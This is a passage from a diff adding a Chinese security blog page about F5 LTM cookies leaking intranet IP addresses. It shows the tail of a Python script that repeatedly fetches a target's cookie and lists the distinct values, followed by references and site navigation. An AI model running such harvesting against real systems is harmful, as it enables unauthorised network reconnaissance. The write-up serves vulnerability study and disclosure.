+-------------------------------+---------------------------------------+'''</span></span><br><span class="line"> <span class="comment">#+------------------------</span></span><br><span class="line"></span><br><span class="line">tblFoot = <span class="string">''' +-------------------------------+---------------------------------------+</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#h3ader = []</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n"</span></span><br><span class="line">bar = Bar(<span class="string">' [+] REQUEST'</span>, max=loop )<span class="comment">#, suffix='%(percent)d%%')</span></span><br><span class="line">nReq = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,loop):</span><br><span class="line">	bar.next()</span><br><span class="line">	h3ader = getCookie(cookie)</span><br><span class="line">	</span><br><span class="line">	strHead = str(h3ader)</span><br><span class="line">	<span class="comment"># // ------------------------------------ //</span></span><br><span class="line">	<span class="comment">#if strHead == "None":</span></span><br><span class="line">	<span class="comment">#	h3ader = strHead</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	time.sleep(<span class="number">.5</span>)</span><br><span class="line">	nReq.append(h3ader)</span><br><span class="line">bar.finish()</span><br><span class="line"></span><br><span class="line">listcook = set(nReq)</span><br><span class="line"><span class="keyword">print</span> tblHead</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ck <span class="keyword">in</span> set(listcook):</span><br><span class="line">	<span class="keyword">print</span> ck</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> tblFoot</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/F5-LTM-leak-intranet-ip/image-20200725003355310.png" alt="image-20200725003355310"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="http://blog.sina.com.cn/s/blog_165b4d5ad0102wxr1.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_165b4d5ad0102wxr1.html</a> </p>
+<p> <a href="https://www.secpulse.com/archives/58730.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/58730.html</a> </p>
+<p> <a href="http://www.52bug.cn/hkjs/4771.html" target="_blank" rel="noopener">http://www.52bug.cn/hkjs/4771.html</a> </p>
+
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/archives/">articles</a></li>
+         
+          <li><a href="/web/">web</a></li>
+         
+          <li><a href="/penetration/">penetration</a></li>
+         
+          <li><a href="/pwn/">pwn</a></li>
+         
+          <li><a href="/docker">docker</a></li>
+         
+          <li><a href="/resources/">resources</a></li>
+         
+          <li><a href="/firends/">firends</a></li>
+         
+          <li><a href="/about/">about</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍"><span class="toc-number">2.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞"><span class="toc-number">3.</span> <span class="toc-text">漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FOFA"><span class="toc-number">4.</span> <span class="toc-text">FOFA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">5.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用"><span class="toc-number">6.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、泄露信息"><span class="toc-number">6.1.</span> <span class="toc-text">1、泄露信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、穷举架构"><span class="toc-number">6.2.</span> <span class="toc-text">2、穷举架构</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">7.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/F5-LTM-leak-intranet-ip/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://rj45mp.github.io/F5-LTM-leak-intranet-ip/&text=F5-LTM-leak-intranet-ip" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/F5-LTM-leak-intranet-ip/&title=F5-LTM-leak-intranet-ip" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/F5-LTM-leak-intranet-ip/&is_video=false&description=F5-LTM-leak-intranet-ip" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=F5-LTM-leak-intranet-ip&body=Check out this article: https://rj45mp.github.io/F5-LTM-leak-intranet-ip/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://rj45mp.github.io/F5-LTM-leak-intranet-ip/&title=F5-LTM-leak-intranet-ip" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://rj45mp.github.io/F5-LTM-leak-intranet-ip/&title=F5-LTM-leak-intranet-ip" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/F5-LTM-leak-intranet-ip/&title=F5-LTM-leak-intranet-ip" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://rj45mp.github.io/F5-LTM-leak-intranet-ip/&title=F5-LTM-leak-intranet-ip" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/F5-LTM-leak-intranet-ip/&name=F5-LTM-leak-intranet-ip&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Rj45
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/archives/">articles</a></li>
+         
+          <li><a href="/web/">web</a></li>
+         
+          <li><a href="/penetration/">penetration</a></li>
+         
+          <li><a href="/pwn/">pwn</a></li>
+         
+          <li><a href="/docker">docker</a></li>
+         
+          <li><a href="/resources/">resources</a></li>
+         
+          <li><a href="/firends/">firends</a></li>
+         
+          <li><a href="/about/">about</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?539c6b41d72f90d25e5ad9d0db4f2321";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
